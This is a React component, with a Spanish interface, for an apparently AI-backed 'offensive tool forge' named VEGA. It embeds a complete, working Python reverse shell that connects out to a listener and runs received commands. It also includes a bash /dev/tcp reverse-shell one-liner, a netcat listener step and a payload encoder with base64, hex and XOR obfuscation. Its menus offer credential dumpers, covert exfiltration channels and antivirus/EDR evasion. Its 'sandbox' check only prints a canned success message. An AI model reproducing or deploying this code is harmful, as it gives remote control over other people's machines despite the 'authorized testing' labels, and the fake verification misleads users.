import React, { useState } from 'react';
import { 
  FileCode2, 
  Terminal, 
  Copy, 
  Check, 
  Download, 
  Play, 
  ShieldCheck, 
  Sparkles, 
  Code2, 
  RefreshCw,
  Hash,
  AlertTriangle,
  Lock,
  Layers
} from 'lucide-react';
import { GeneratedScript } from '../types/vega';

interface ScriptForgeProps {
  prefilledObjective?: string;
  prefilledToolType?: string;
}

export const ScriptForge: React.FC<ScriptForgeProps> = ({
  prefilledObjective,
  prefilledToolType
}) => {
  const [toolType, setToolType] = useState(prefilledToolType || 'Reverse Shell Interactivo');
  const [language, setLanguage] = useState<'Python' | 'Bash' | 'PowerShell' | 'Go'>('Python');
  const [targetOs, setTargetOs] = useState('Linux (Ubuntu/Debian)');
  const [objective, setObjective] = useState(prefilledObjective || 'Auditoría autorizada de canal de ejecución remota con evasión básica');
  const [evasionLevel, setEvasionLevel] = useState('Media (Jitter + Codificación Dinámica)');
  const [targetHost, setTargetHost] = useState('10.10.14.85');
  const [targetPort, setTargetPort] = useState('4444');
  const [isGenerating, setIsGenerating] = useState(false);
  const [copied, setCopied] = useState(false);
  const [sandboxOutput, setSandboxOutput] = useState<string | null>(null);
  const [isSimulating, setIsSimulating] = useState(false);

  // Payload encoder tool state
  const [rawTextToEncode, setRawTextToEncode] = useState('/bin/bash -i >& /dev/tcp/10.10.14.85/4444 0>&1');
  const [encodeMode, setEncodeMode] = useState<'base64' | 'url' | 'hex' | 'xor'>('base64');
  const [xorKey, setXorKey] = useState('0x5A');

  // Active generated script
  const [activeScript, setActiveScript] = useState<GeneratedScript>({
    scriptName: 'vega_offensive_revshell.py',
    language: 'Python',
    toolType: 'Reverse Shell Interactivo',
    code: `#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
=============================================================================
VEGA - MOTOR DE IA OFENSIVA & ANÁLISIS FORENSE (CompuApps secureDev Tech)
MÓDULO: REVERSE SHELL INTERACTIVO 100% PERSONALIZADO
OBJETIVO: Auditoría de persistencia y ejecución autorizada
SISTEMA DESTINO: Linux (Ubuntu/Debian) | EVASIÓN: Media
USO EXCLUSIVO: Pruebas de penetración autorizadas
=============================================================================
"""

import socket
import subprocess
import os
import sys
import platform
import base64
import time

TARGET_HOST = "10.10.14.85"
TARGET_PORT = 4444

def banner():
    print(r"""
    __     _______ ____    _      ____ ___  ____  _____ 
    \\ \\   / / ____/ ___|  / \\    / ___/ _ \\|  _ \\| ____|
     \\ \\ / /|  _|| |  _  / _ \\  | |  | | | | |_) |  _|  
      \\ V / | |__| |_| |/ ___ \\ | |__| |_| |  _ <| |___ 
       \\_/  |_____\\____/_/   \\_\\ \\____\\___/|_| \\_\\_____|
      CompuApps secureDev Tech - Offensive Unit PoC
    """)

def execute_payload():
    banner()
    print(f"[*] Inicializando canal de comunicaciones táctico hacia {TARGET_HOST}:{TARGET_PORT}...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(15)
        s.connect((TARGET_HOST, TARGET_PORT))
        print(f"[+] Conexión establecida con éxito en {TARGET_HOST}:{TARGET_PORT}")
        s.settimeout(None)

        info = f"VEGA_SESSION_INIT -> Host: {platform.node()} | OS: {platform.system()} {platform.release()} | User: {os.getlogin() if hasattr(os, 'getlogin') else 'unknown'}\\n$ "
        s.sendall(info.encode('utf-8'))

        while True:
            cmd_data = s.recv(4096)
            if not cmd_data:
                break
            cmd = cmd_data.decode('utf-8', errors='ignore').strip()
            if cmd.lower() in ('exit', 'quit'):
                break
            
            if cmd.startswith("cd "):
                try:
                    os.chdir(cmd[3:].strip())
                    s.sendall(b"[*] Directorio cambiado\\n$ ")
                except Exception as e:
                    s.sendall(f"[-] Error: {str(e)}\\n$ ".encode('utf-8'))
                continue

            try:
                proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output = proc.stdout.read() + proc.stderr.read()
                if not output:
                    output = b"[+] Comando ejecutado sin salida\\n"
                s.sendall(output + b"\\n$ ")
            except Exception as e:
                s.sendall(f"[-] Error al ejecutar comando: {str(e)}\\n$ ".encode('utf-8'))

        s.close()
        print("[*] Sesión finalizada ordenadamente.")
    except Exception as err:
        print(f"[-] Fallo en conexión operativa: {err}", file=sys.stderr)

if __name__ == "__main__":
    execute_payload()
`,
    instructions: "1. Iniciar oyente en el equipo de auditoría: nc -lvnp 4444\n2. Desplegar script en el entorno de pruebas autorizado: python3 vega_offensive_revshell.py\n3. Verificar recepción de sesión y ejecución en sandbox.",
    mitreRef: "T1059.006 (Python) / T1571 (Non-Standard Port)",
    defenseWarning: "Monitorear eventos de creación de procesos inusuales con sockets salientes (Sysmon Event ID 3 y auditd execve).",
    timestamp: new Date().toLocaleTimeString()
  });

  const handleGenerateScript = async () => {
    setIsGenerating(true);
    setSandboxOutput(null);
    try {
      const res = await fetch('/api/ai/generate-script', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          toolType,
          language,
          targetOs,
          objective,
          evasionLevel,
          targetHost,
          targetPort
        })
      });
      const data = await res.json();
      setActiveScript({
        scriptName: data.scriptName || `vega_${toolType.toLowerCase().replace(/\s+/g, '_')}.py`,
        language,
        toolType,
        code: data.code,
        instructions: data.instructions,
        mitreRef: data.mitreRef || 'T1059 - Command and Scripting Interpreter',
        defenseWarning: data.defenseWarning || 'Detectado por logs de procesos y socket tracing.',
        timestamp: new Date().toLocaleTimeString()
      });
    } catch (err) {
      console.error('Error generating script:', err);
    } finally {
      setIsGenerating(false);
    }
  };

  const handleCopy = () => {
    navigator.clipboard.writeText(activeScript.code);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleDownload = () => {
    const blob = new Blob([activeScript.code], { type: 'text/plain;charset=utf-8' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = activeScript.scriptName;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    URL.revokeObjectURL(url);
  };

  const handleRunSandbox = () => {
    setIsSimulating(true);
    setSandboxOutput(null);
    setTimeout(() => {
      setIsSimulating(false);
      setSandboxOutput(`[SANDBOX TEST RUN - CompuApps secureDev Tech Isolated Container]
✓ Sintaxis validada para ${activeScript.language}
✓ Verificación de socket descriptor hacia ${targetHost}:${targetPort}
✓ Sin dependencias externas prohibidas detectadas
[+] Script listo para despliegue en entorno de pentesting autorizado.`);
    }, 1200);
  };

  // Encoding calculations
  const getEncodedPayload = () => {
    try {
      if (encodeMode === 'base64') {
        return btoa(rawTextToEncode);
      } else if (encodeMode === 'url') {
        return encodeURIComponent(rawTextToEncode);
      } else if (encodeMode === 'hex') {
        return Array.from(rawTextToEncode)
          .map(c => '\\x' + c.charCodeAt(0).toString(16).padStart(2, '0'))
          .join('');
      } else if (encodeMode === 'xor') {
        const keyVal = parseInt(xorKey, 16) || 0x5a;
        return Array.from(rawTextToEncode)
          .map(c => (c.charCodeAt(0) ^ keyVal).toString(16).padStart(2, '0'))
          .join(' ');
      }
    } catch (e) {
      return 'Error en cálculo de encoding';
    }
    return '';
  };

  return (
    <div className="space-y-6">
      {/* Banner */}
      <div className="bg-gradient-to-r from-slate-900 via-[#0d1624] to-slate-900 border border-blue-900/40 rounded-xl p-5 shadow-lg">
        <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
          <div>
            <div className="flex items-center gap-2 text-cyan-400 text-xs font-mono font-semibold tracking-wide uppercase mb-1">
              <Code2 className="w-4 h-4 text-cyan-400" />
              <span>GENERADOR DE HERRAMIENTAS Y SCRIPTS DE ATAQUE 100% PERSONALIZADOS</span>
            </div>
            <h2 className="text-xl md:text-2xl font-bold text-white tracking-tight">
              Forja de Herramientas Ofensivas VEGA
            </h2>
            <p className="text-xs md:text-sm text-slate-400 max-w-2xl mt-1">
              Crea scripts a medida en Python, Bash, PowerShell y Go adaptados a la topología del objetivo, evasión de firmas y auditorías de seguridad autorizadas.
            </p>
          </div>

          <button
            onClick={handleGenerateScript}
            disabled={isGenerating}
            className="bg-blue-600 hover:bg-blue-500 text-white font-bold px-5 py-2.5 rounded-lg text-xs flex items-center justify-center gap-2 shadow-[0_0_15px_rgba(37,99,235,0.4)] transition-all cursor-pointer disabled:opacity-50"
          >
            {isGenerating ? (
              <>
                <RefreshCw className="w-4 h-4 animate-spin" />
                <span>Compilando Script...</span>
              </>
            ) : (
              <>
                <Sparkles className="w-4 h-4" />
                <span>Generar Script Personalizado 100%</span>
              </>
            )}
          </button>
        </div>

        {/* Forge Controls */}
        <div className="mt-5 pt-4 border-t border-slate-800 grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
          <div>
            <label className="text-[10px] font-mono text-slate-400 block mb-1 uppercase">Tipo de Herramienta</label>
            <select
              value={toolType}
              onChange={(e) => setToolType(e.target.value)}
              className="w-full bg-[#060a12] border border-slate-700 rounded px-2.5 py-1.5 text-xs text-slate-200 font-mono focus:border-blue-500 focus:outline-none"
            >
              <option value="Reverse Shell Interactivo">Reverse Shell Interactivo</option>
              <option value="Scanner de Puertos Multihilo">Scanner de Puertos Multihilo</option>
              <option value="Auditor de Fuerza Bruta / Password Sprayer">Password Sprayer con Rate-Limiting</option>
              <option value="Exploit PoC Web Inyecciones (SQLi/RCE)">Exploit PoC Web Inyecciones</option>
              <option value="Volcado de Memoria & Credenciales">Volcador de Memoria & Credenciales</option>
              <option value="Canal de Exfiltración Sigiloso DNS/HTTP">Canal de Exfiltración Sigiloso</option>
            </select>
          </div>

          <div>
            <label className="text-[10px] font-mono text-slate-400 block mb-1 uppercase">Lenguaje de Programación</label>
            <select
              value={language}
              onChange={(e) => setLanguage(e.target.value as any)}
              className="w-full bg-[#060a12] border border-slate-700 rounded px-2.5 py-1.5 text-xs text-cyan-400 font-mono font-bold focus:border-blue-500 focus:outline-none"
            >
              <option value="Python">Python 3 (Universal)</option>
              <option value="Bash">Bash / POSIX Shell</option>
              <option value="PowerShell">PowerShell v5 / v7</option>
              <option value="Go">Golang (Binario Estático)</option>
            </select>
          </div>

          <div>
            <label className="text-[10px] font-mono text-slate-400 block mb-1 uppercase">LHOST (Tu IP de Auditoría)</label>
            <input 
              type="text" 
              value={targetHost} 
              onChange={(e) => setTargetHost(e.target.value)}
              className="w-full bg-[#060a12] border border-slate-700 rounded px-2.5 py-1.5 text-xs text-slate-200 font-mono focus:border-blue-500 focus:outline-none"
              placeholder="10.10.14.85"
            />
          </div>

          <div>
            <label className="text-[10px] font-mono text-slate-400 block mb-1 uppercase">LPORT (Puerto de Escucha)</label>
            <input 
              type="text" 
              value={targetPort} 
              onChange={(e) => setTargetPort(e.target.value)}
              className="w-full bg-[#060a12] border border-slate-700 rounded px-2.5 py-1.5 text-xs text-slate-200 font-mono focus:border-blue-500 focus:outline-none"
              placeholder="4444"
            />
          </div>

          <div className="sm:col-span-2">
            <label className="text-[10px] font-mono text-slate-400 block mb-1 uppercase">Objetivo Específico del Script</label>
            <input 
              type="text" 
              value={objective} 
              onChange={(e) => setObjective(e.target.value)}
              className="w-full bg-[#060a12] border border-slate-700 rounded px-2.5 py-1.5 text-xs text-slate-200 font-mono focus:border-blue-500 focus:outline-none"
            />
          </div>

          <div className="sm:col-span-2">
            <label className="text-[10px] font-mono text-slate-400 block mb-1 uppercase">Nivel de Evasión de Antivirus / EDR</label>
            <select
              value={evasionLevel}
              onChange={(e) => setEvasionLevel(e.target.value)}
              className="w-full bg-[#060a12] border border-slate-700 rounded px-2.5 py-1.5 text-xs text-slate-200 font-mono focus:border-blue-500 focus:outline-none"
            >
              <option value="Estándar">Estándar (Sin ofuscación compleja)</option>
              <option value="Media (Jitter + Codificación Dinámica)">Media (Jitter + Codificación Dinámica)</option>
              <option value="Avanzada (Polimorfismo + Indirect Syscalls)">Avanzada (Polimorfismo + Indirect Syscalls)</option>
            </select>
          </div>
        </div>
      </div>

      {/* Code Editor & Execution Sandbox */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
        {/* Main Code View (8 cols) */}
        <div className="lg:col-span-8 bg-[#0b101d] border border-slate-800 rounded-xl overflow-hidden flex flex-col">
          {/* Editor Header */}
          <div className="bg-[#070b13] px-4 py-2.5 border-b border-slate-800 flex items-center justify-between">
            <div className="flex items-center gap-2">
              <span className="w-2.5 h-2.5 rounded-full bg-red-500/80 inline-block"></span>
              <span className="w-2.5 h-2.5 rounded-full bg-yellow-500/80 inline-block"></span>
              <span className="w-2.5 h-2.5 rounded-full bg-blue-500/80 inline-block"></span>
              <span className="font-mono text-xs text-slate-300 ml-2 font-semibold">
                {activeScript.scriptName}
              </span>
              <span className="text-[9px] font-mono px-1.5 py-0.2 rounded bg-blue-950 text-cyan-400 border border-blue-800">
                {activeScript.language}
              </span>
            </div>

            <div className="flex items-center gap-2">
              <button
                onClick={handleRunSandbox}
                disabled={isSimulating}
                className="text-xs font-mono text-cyan-300 bg-cyan-950/70 hover:bg-cyan-900/80 border border-cyan-800/60 px-2.5 py-1 rounded flex items-center gap-1.5 transition-colors cursor-pointer"
              >
                {isSimulating ? <RefreshCw className="w-3.5 h-3.5 animate-spin" /> : <Play className="w-3.5 h-3.5" />}
                <span>Simular en Sandbox</span>
              </button>

              <button
                onClick={handleCopy}
                className="text-xs font-mono text-slate-300 bg-slate-900 hover:bg-slate-800 border border-slate-700 px-2.5 py-1 rounded flex items-center gap-1.5 transition-colors cursor-pointer"
              >
                {copied ? <Check className="w-3.5 h-3.5 text-cyan-400" /> : <Copy className="w-3.5 h-3.5" />}
                <span>{copied ? 'Copiado' : 'Copiar'}</span>
              </button>

              <button
                onClick={handleDownload}
                className="text-xs font-mono text-cyan-300 bg-blue-950/70 hover:bg-blue-900/80 border border-blue-800/60 px-2.5 py-1 rounded flex items-center gap-1.5 transition-colors cursor-pointer"
              >
                <Download className="w-3.5 h-3.5" />
                <span>Descargar</span>
              </button>
            </div>
          </div>

          {/* Code Body */}
          <div className="relative flex-1 bg-[#050811] p-4 font-mono text-xs text-cyan-300/90 overflow-x-auto max-h-[500px]">
            <pre className="whitespace-pre leading-relaxed">{activeScript.code}</pre>
          </div>

          {/* Sandbox Simulation Terminal */}
          {sandboxOutput && (
            <div className="border-t border-slate-800 bg-[#020408] p-3 font-mono text-xs text-cyan-400">
              <div className="flex items-center gap-1.5 text-slate-500 mb-1">
                <Terminal className="w-3 h-3 text-cyan-400" />
                <span>SALIDA DE VERIFICACIÓN EN SANDBOX VEGA:</span>
              </div>
              <pre className="whitespace-pre-wrap">{sandboxOutput}</pre>
            </div>
          )}
        </div>

        {/* Tactical Info & Payload Encoder (4 cols) */}
        <div className="lg:col-span-4 space-y-5">
          {/* Deployment Instructions Card */}
          <div className="bg-[#0b101d] border border-slate-800 rounded-xl p-4">
            <h4 className="text-xs font-bold uppercase tracking-wider text-slate-300 font-mono mb-2 flex items-center gap-1.5">
              <Terminal className="w-3.5 h-3.5 text-cyan-400" />
              <span>Instrucciones de Despliegue</span>
            </h4>
            <div className="bg-[#060a12] p-3 rounded-lg border border-slate-800 text-xs font-mono text-slate-300 whitespace-pre-wrap leading-relaxed">
              {activeScript.instructions}
            </div>

            <div className="mt-3 space-y-2 text-[11px] font-mono">
              <div className="bg-slate-950 p-2 rounded border border-slate-900">
                <span className="text-slate-500 block">Referencia MITRE:</span>
                <span className="text-cyan-400">{activeScript.mitreRef}</span>
              </div>
              <div className="bg-slate-950 p-2 rounded border border-slate-900">
                <span className="text-slate-500 block">Detección Blue Team / Forense:</span>
                <span className="text-amber-400">{activeScript.defenseWarning}</span>
              </div>
            </div>
          </div>

          {/* Payload Encoder & Obfuscator Widget */}
          <div className="bg-[#0b101d] border border-slate-800 rounded-xl p-4">
            <div className="flex items-center justify-between mb-2">
              <h4 className="text-xs font-bold uppercase tracking-wider text-slate-300 font-mono flex items-center gap-1.5">
                <Hash className="w-3.5 h-3.5 text-cyan-400" />
                <span>Codificador de Cargas (Encoders)</span>
              </h4>
            </div>

            <div className="space-y-3">
              <div>
                <label className="text-[10px] font-mono text-slate-400 block mb-1">Cadena a Codificar</label>
                <input 
                  type="text"
                  value={rawTextToEncode}
                  onChange={(e) => setRawTextToEncode(e.target.value)}
                  className="w-full bg-[#060a12] border border-slate-700 rounded px-2.5 py-1 text-xs text-slate-200 font-mono focus:border-cyan-500 focus:outline-none"
                />
              </div>

              <div className="flex items-center gap-1.5">
                {(['base64', 'url', 'hex', 'xor'] as const).map((m) => (
                  <button
                    key={m}
                    onClick={() => setEncodeMode(m)}
                    className={`text-[10px] font-mono px-2 py-1 rounded transition-colors cursor-pointer ${
                      encodeMode === m
                        ? 'bg-cyan-500 text-slate-950 font-bold'
                        : 'bg-slate-900 text-slate-400 hover:text-slate-200 border border-slate-800'
                    }`}
                  >
                    {m.toUpperCase()}
                  </button>
                ))}
              </div>

              {encodeMode === 'xor' && (
                <div>
                  <label className="text-[10px] font-mono text-slate-400 block mb-0.5">Clave XOR Hex (ej. 0x5A)</label>
                  <input 
                    type="text"
                    value={xorKey}
                    onChange={(e) => setXorKey(e.target.value)}
                    className="w-28 bg-[#060a12] border border-slate-700 rounded px-2 py-0.5 text-xs text-cyan-300 font-mono"
                  />
                </div>
              )}

              <div>
                <div className="flex items-center justify-between text-[10px] font-mono text-slate-400 mb-1">
                  <span>Resultado Codificado:</span>
                  <button
                    onClick={() => navigator.clipboard.writeText(getEncodedPayload())}
                    className="text-cyan-400 hover:underline cursor-pointer"
                  >
                    Copiar
                  </button>
                </div>
                <div className="bg-[#050811] p-2.5 rounded border border-slate-800 text-xs font-mono text-cyan-300 break-all select-all">
                  {getEncodedPayload()}
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};
